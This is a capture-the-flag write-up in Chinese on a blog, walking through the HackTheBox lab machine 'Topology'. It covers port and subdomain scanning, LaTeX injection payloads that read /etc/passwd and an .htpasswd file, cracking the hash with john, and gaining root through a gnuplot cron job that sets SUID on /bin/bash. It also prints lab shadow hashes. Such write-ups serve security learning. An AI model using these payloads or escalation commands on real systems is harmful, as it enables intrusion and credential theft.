---
title: Topology - HackTheBox
url: https://darkwing.moe/2023/06/12/Topology-HackTheBox/
source: 喵喵喵喵
date: 2023-06-13
fetch_date: 2025-10-04T11:45:57.343134
---

# Topology - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Topology - HackTheBox

# Topology - HackTheBox

##### 2023-06-12

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. stats](#stats)
   2. [3.2. dev](#dev)
4. [4. latex.topology.htb](#latex-topology-htb)
   1. [4.1. latex injection](#latex-injection)
   2. [4.2. dev htpasswd](#dev-htpasswd)
   3. [4.3. htpasswd crack](#htpasswd-crack)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Topology - HackTheBox

2023-06-12

# 基本信息

* <https://app.hackthebox.com/machines/Topology>
* 10.10.11.217

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061201.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.217 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-12 14:12 CST Nmap scan report for 10.10.11.217 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA) |   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA) |_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Miskatonic University | Topology Group |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43.58 seconds ``` |

## 80

直接访问是一个小组主页，邮箱和页面链接得到域名：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061202.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061205.jpg)

# 子域名扫描

得到的域名添加hosts后扫描子域名,得到stats和dev：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` 10.10.11.217 topology.htb  ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://topology.htb/" -H 'Host: FUZZ.topology.htb' -fs 6767  [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 272ms]     * FUZZ: stats ... [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 7395ms]     * FUZZ: dev ``` |

## stats

Server 状态：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061203.jpg)

## dev

需要登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061204.jpg)

# latex.topology.htb

是一个在线latex转换器，输入latex输出png图片：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061206.jpg)

## latex injection

latex自身语法功能强大，可以注入其他命令，例如读文件：

* PayloadsAllTheThings/LaTeX Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub
  <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection>
* Formula/CSV/Doc/LaTeX Injection - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-file>

存在一些过滤，生成的图片提示不合法命令，但简单测试发现到这个的时候响应空白：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` \lstinputlisting{/etc/passwd} ``` |

继续搜索latex语法，发现latex使用`$`作为分隔符：

* 【LaTeX应用】常用数学公式和符号 - 知乎
  <https://zhuanlan.zhihu.com/p/464237097>

> 单行文本公式放在`$`与`$`之间，或者`$$`与`$$`之间，例如
>
> |  |  |
> | --- | --- |
> | ``` 1 ``` | ``` $ y=x^2 $ ``` |

所以最终读取文件的payload是：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $\lstinputlisting{/etc/passwd}$ ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061213.jpg)

## dev htpasswd

前面dev那里需要登录，结合是apache，那就可以直接读apache的 .htpassd文件：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $\lstinputlisting{/var/www/dev/.htpasswd}$ ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061208.jpg)

得到的图片找个OCR提取出文本

|  |  |
| --- | --- |
| ``` 1 ``` | ``` vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 ``` |

## htpasswd crack

然后破解hash，得到vdaisley的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` $ cat hash.txt $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=md5crypt  calculus20 ``` |

# user flag

得到的账号密码ssh登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061209.jpg)

# 提权信息

运行pspy，发现gnuplot:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061210.jpg)

定时运行对应目录下的任意plt文件，这个目录我们有权限，可以创建要运行的plt文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061211.jpg)

另外gnuplt可以运行shell命令：

* Shell
  <http://www.gnuplot.info/docs_4.2/node327.html>

那就可以在自定义plt中执行任意命令

# 提权 & root flag

简单的加suid，等待触发执行：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/miao.plt ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061212.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$P153wNg6DwlTSIv0$QFutCIjQWlJM24O6vyD5aoRv7kyvivOykonMDItV8rSqKpznqsmxfK7L51il6V7yF75qHE.Hkv6YLK25TSEle1:19496:0:99999:7::: vdaisley:$6$gRnKXcAaVVjMGjaY$PuuHK2.WUsdjSd/0ife.Arm05hBBZSZUNTGBrojnvRS4zrvV3prcBac4nOH0Id.7bArqL7QtqAAICTs0fQ2Al0:19063:0:99999:7::: ``` |

# 参考资料

* PayloadsAllTheThings/LaTeX Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub
  <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection>
* Formula/CSV/Doc/LaTeX Injection - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-file>
* 【LaTeX应用】常用数学公式和符号 - 知乎
  <https://zhuanlan.zhihu.com/p/464237097>
* Shell
  <http://www.gnuplot.info/docs_4.2/node327.html>

> Last updated: 2023-11-06 09:44:50
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Sandworm - HackTheBox](/2023/06/19/Sandworm-HackTheBox/)

[Next

#### TwoMillion - HackTheBox](/2023/06/07/TwoMillion-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)